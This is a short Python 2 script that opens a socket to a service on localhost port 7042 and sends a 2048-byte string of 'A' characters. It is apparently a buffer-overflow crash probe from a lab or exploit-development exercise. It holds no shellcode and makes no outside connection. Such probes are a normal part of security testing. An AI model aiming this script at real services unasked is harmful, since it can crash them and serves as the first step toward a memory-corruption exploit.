#!/usr/bin/env python2
import socket

print "Let's start"

yolo = "A" * 2048

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

s.connect(("127.0.0.1", 7042))
s.send(yolo)

s.close()

print "Finished"
